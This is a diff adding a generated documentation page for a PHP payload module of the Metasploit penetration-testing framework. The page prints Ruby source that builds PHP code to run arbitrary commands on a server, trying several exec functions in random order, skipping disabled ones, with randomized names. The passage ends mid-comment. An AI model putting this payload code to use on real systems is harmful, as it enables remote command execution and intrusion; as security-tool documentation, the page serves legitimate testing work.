@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Php
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Php";
+  relpath = '../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../_index.html">Index (P)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span>
+     &raquo; 
+    <span class="title">Php</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Php
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="../Exploit/PhpEXE.html" title="Msf::Exploit::PhpEXE (module)">Exploit::PhpEXE</a></span>, <span class='object_link'><a href="Php/BindTcp.html" title="Msf::Payload::Php::BindTcp (module)">BindTcp</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/php.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Defined Under Namespace</h2>
+<p class="children">
+  
+    
+      <strong class="modules">Modules:</strong> <span class='object_link'><a href="Php/BindTcp.html" title="Msf::Payload::Php::BindTcp (module)">BindTcp</a></span>, <span class='object_link'><a href="Php/ReverseTcp.html" title="Msf::Payload::Php::ReverseTcp (module)">ReverseTcp</a></span>, <span class='object_link'><a href="Php/SendUUID.html" title="Msf::Payload::Php::SendUUID (module)">SendUUID</a></span>
+    
+  
+    
+  
+</p>
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#php_preamble-instance_method" title="#php_preamble (instance method)">#<strong>php_preamble</strong>(options = {})  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate a chunk of PHP code that should be eval&#39;d before #php_system_block.</p>
+</div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#php_system_block-instance_method" title="#php_system_block (instance method)">#<strong>php_system_block</strong>(options = {})  &#x21d2; String </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>Generate a chunk of PHP code that tries to run a command.</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="php_preamble-instance_method">
+  
+    #<strong>php_preamble</strong>(options = {})  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate a chunk of PHP code that should be eval&#39;d before #php_system_block.</p>
+
+<p>The generated code will initialize</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>options</span>
+      
+      
+        <span class='type'>(<tt>Hash</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>{}</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>a customizable set of options</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+  
+    
+    
+    <p class="tag_title">Options Hash (<tt>options</tt>):</p>
+    <ul class="option">
+      
+        <li>
+          <span class="name">:disabled_varname</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>PHP variable name in which to store an array of disabled functions.</p>
+</div>
+          
+        </li>
+      
+    </ul>
+  
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>A chunk of PHP code</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php.rb', line 19</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_php_preamble'>php_preamble</span><span class='lparen'>(</span><span class='id identifier rubyid_options'>options</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dis'>dis</span> <span class='op'>=</span> <span class='id identifier rubyid_options'>options</span><span class='lbracket'>[</span><span class='symbol'>:disabled_varname</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>4</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dis'>dis</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_dis'>dis</span> <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_dis'>dis</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='ivar'>@dis</span> <span class='op'>=</span> <span class='id identifier rubyid_dis'>dis</span>
+
+  <span class='comment'># Canonicalize the list of disabled functions to facilitate choosing a
+</span>  <span class='comment'># system-like function later.
+</span>  <span class='id identifier rubyid_preamble'>preamble</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>/*&lt;?php /**/
+    @error_reporting(0);
+    @set_time_limit(0); @ignore_user_abort(1); @ini_set(&#39;max_execution_time&#39;,0);
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>=@ini_get(&#39;disable_functions&#39;);
+    if(!empty(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>=preg_replace(&#39;/[, ]+/&#39;, &#39;,&#39;, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>=explode(&#39;,&#39;, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>=array_map(&#39;trim&#39;, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+    }else{
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>=array();
+    }
+    </span><span class='tstring_end'>&quot;</span></span>
+  <span class='kw'>return</span> <span class='id identifier rubyid_preamble'>preamble</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="php_system_block-instance_method">
+  
+    #<strong>php_system_block</strong>(options = {})  &#x21d2; <tt>String</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate a chunk of PHP code that tries to run a command.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>options</span>
+      
+      
+        <span class='type'>(<tt>Hash</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>{}</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>a customizable set of options</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+  
+    
+    
+    <p class="tag_title">Options Hash (<tt>options</tt>):</p>
+    <ul class="option">
+      
+        <li>
+          <span class="name">:cmd_varname</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>PHP variable name containing the command to run</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:disabled_varname</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>PHP variable name containing an array of disabled functions. See #php_preamble</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:output_varname</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>PHP variable name in which to store the output of the command. Will contain 0 if no exec functions work.</p>
+</div>
+          
+        </li>
+      
+    </ul>
+  
+
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>String</tt>)</span>
+      
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>A chunk of PHP code that, with a little luck, will run a command.</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/php.rb', line 56</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_php_system_block'>php_system_block</span><span class='lparen'>(</span><span class='id identifier rubyid_options'>options</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_cmd'>cmd</span> <span class='op'>=</span> <span class='id identifier rubyid_options'>options</span><span class='lbracket'>[</span><span class='symbol'>:cmd_varname</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$cmd</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_dis'>dis</span> <span class='op'>=</span> <span class='id identifier rubyid_options'>options</span><span class='lbracket'>[</span><span class='symbol'>:disabled_varname</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='ivar'>@dis</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>4</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='id identifier rubyid_options'>options</span><span class='lbracket'>[</span><span class='symbol'>:output_varname</span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>4</span><span class='rparen'>)</span>
+
+  <span class='kw'>if</span> <span class='lparen'>(</span><span class='ivar'>@dis</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span><span class='rparen'>)</span>
+    <span class='ivar'>@dis</span> <span class='op'>=</span> <span class='id identifier rubyid_dis'>dis</span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_cmd'>cmd</span>    <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_cmd'>cmd</span> <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_dis'>dis</span>    <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_dis'>dis</span> <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_dis'>dis</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_output'>output</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='id identifier rubyid_output'>output</span> <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_output'>output</span><span class='lbracket'>[</span><span class='int'>0</span><span class='comma'>,</span><span class='int'>1</span><span class='rbracket'>]</span> <span class='op'>!=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_is_callable'>is_callable</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>4</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_in_array'>in_array</span>    <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>$</span><span class='tstring_end'>&#39;</span></span> <span class='op'>+</span> <span class='const'><span class='object_link'><a href="../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>4</span><span class='rparen'>)</span> <span class='op'>+</span> <span class='int'>4</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_setup'>setup</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if (FALSE !== strpos(strtolower(PHP_OS), &#39;win&#39; )) {
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>=</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>.\&quot; 2&gt;&amp;1\\n\&quot;;
+    }
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>=&#39;is_callable&#39;;
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>=&#39;in_array&#39;;
+    </span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_shell_exec'>shell_exec</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;shell_exec&#39;)and!</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;shell_exec&#39;,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=shell_exec(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+    }else</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_passthru'>passthru</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;passthru&#39;)and!</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;passthru&#39;,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      ob_start();
+      passthru(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=ob_get_contents();
+      ob_end_clean();
+    }else</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_system'>system</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;system&#39;)and!</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;system&#39;,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      ob_start();
+      system(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=ob_get_contents();
+      ob_end_clean();
+    }else</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_exec'>exec</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;exec&#39;)and!</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;exec&#39;,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=array();
+      exec(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=join(chr(10),</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>).chr(10);
+    }else</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_proc_open'>proc_open</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;proc_open&#39;)and!</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;proc_open&#39;,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      $handle=proc_open(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>,array(array(&#39;pipe&#39;,&#39;r&#39;),array(&#39;pipe&#39;,&#39;w&#39;),array(&#39;pipe&#39;,&#39;w&#39;)),$pipes);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=NULL;
+      while(!feof($pipes[1])){
+        </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>.=fread($pipes[1],1024);
+      }
+      @proc_close($handle);
+    }else</span><span class='tstring_end'>&quot;</span></span>
+  <span class='id identifier rubyid_popen'>popen</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    if(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_is_callable'>is_callable</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;popen&#39;)and!</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_in_array'>in_array</span><span class='embexpr_end'>}</span><span class='tstring_content'>(&#39;popen&#39;,</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_dis'>dis</span><span class='embexpr_end'>}</span><span class='tstring_content'>)){
+      $fp=popen(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='embexpr_end'>}</span><span class='tstring_content'>,&#39;r&#39;);
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=NULL;
+      if(is_resource($fp)){
+        while(!feof($fp)){
+          </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>.=fread($fp,1024);
+        }
+      }
+      @pclose($fp);
+    }else</span><span class='tstring_end'>&quot;</span></span>
+  <span class='comment'># Currently unused until we can figure out how to get output with COM
+</span>  <span class='comment'># objects (which are not subject to safe mode restrictions) instead of
+</span>  <span class='comment'># PHP functions.
+</span>  <span class='comment'>#win32_com = &quot;
+</span>  <span class='comment'>#	if (FALSE !== strpos(strtolower(PHP_OS), &#39;win&#39; )) {
+</span>  <span class='comment'>#		$wscript = new COM(&#39;Wscript.Shell&#39;);
+</span>  <span class='comment'>#		$wscript-&gt;run(#{cmd} . &#39; &gt; %TEMP%\\out.txt&#39;);
+</span>  <span class='comment'>#		#{output} = file_get_contents(&#39;%TEMP%\\out.txt&#39;);
+</span>  <span class='comment'>#	}else&quot;
+</span>  <span class='id identifier rubyid_fail_block'>fail_block</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>
+    {
+      </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_output'>output</span><span class='embexpr_end'>}</span><span class='tstring_content'>=0;
+    }
+  </span><span class='tstring_end'>&quot;</span></span>
+
+  <span class='id identifier rubyid_exec_methods'>exec_methods</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_passthru'>passthru</span><span class='comma'>,</span> <span class='id identifier rubyid_shell_exec'>shell_exec</span><span class='comma'>,</span> <span class='id identifier rubyid_system'>system</span><span class='comma'>,</span> <span class='id identifier rubyid_exec'>exec</span><span class='comma'>,</span> <span class='id identifier rubyid_proc_open'>proc_open</span><span class='comma'>,</span> <span class='id identifier rubyid_popen'>popen</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_sort_by'>sort_by</span> <span class='lbrace'>{</span> <span class='id identifier rubyid_rand'>rand</span> <span class='rbrace'>}</span>
+  <span class='id identifier rubyid_buf'>buf</span> <span class='op'>=</span> <span class='id identifier rubyid_setup'>setup</span> <span class='op'>+</span> <span class='id identifier rubyid_exec_methods'>exec_methods</span><span class='period'>.</span><span class='id identifier rubyid_join'>join</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span> <span class='op'>+</span> <span class='id identifier rubyid_fail_block'>fail_block</span>
+  <span class='comment'>#buf = Rex::Text.compress(buf)
+</span>
+  <span class='comment'>###
+</span>  <span class='comment'># All of this junk should go in an encoder
+</span>  <span class='comment'>#
+</span>  <span class='comment'># Replace all single-quoted strings with quoteless equivalents, e.g.:
+</span>  <span class='comment'>#    echo(&#39;asdf&#39;);
+</span>  <span class='comment'># becomes
+</span>  <span class='comment'>#    echo($a.$s.$d.$f);
+</span>  <span class='comment'># and add &quot;$a=chr(97);&quot; et al to the top of the block
+</span>  <span class='comment'>#
+</span>  <span class='comment'># Once this is complete, it is guaranteed that there are no spaces
+</span>  <span class='comment'># inside strings.  This combined with the fact that there are no
+</span>  <span class='comment'># function definitions, which require a space between the &quot;function&quot;
+</span>  <span class='comment'># keyword and the name, means we can completely remove spaces.
+</span>  <span class='comment'>#
+</span>  <span class='comment'>#alpha_used = { 95 }
+</span>  <span class='comment'>#buf.gsub!(/&#39;(.*?)&#39;/) {
+</span>  <span class='comment'>#	str_array = []
+</span>  <span class='comment'>#	$1.each_byte { |c|
+</span>  <span class='comment'>#		if ((&#39;a&#39;..&#39;z&#39;).include?(c.chr))
+</span>  <span class='comment'>#			alpha_used[c] = 1
+</span>  <span class='comment'>#			str_array &lt;&lt; &quot;$#{c.chr}.&quot;
+</span>  <span class='comment'>#		else
+</span>  <span class='comment'>#			str_array &lt;&lt; &quot;chr(#{c}).&quot;
+</span>  <span class='comment'>#		end
+</span>  <span class='comment'>#	}
+</span>  <span class='comment'>#	str_array.last.chop!
+</span>  <span class='comment'>#	str_array.join(&quot;&quot;)
+</span>  <span class='comment'>#}
+</span>  <span class='comment'>#if (alpha_used.length &gt; 1)
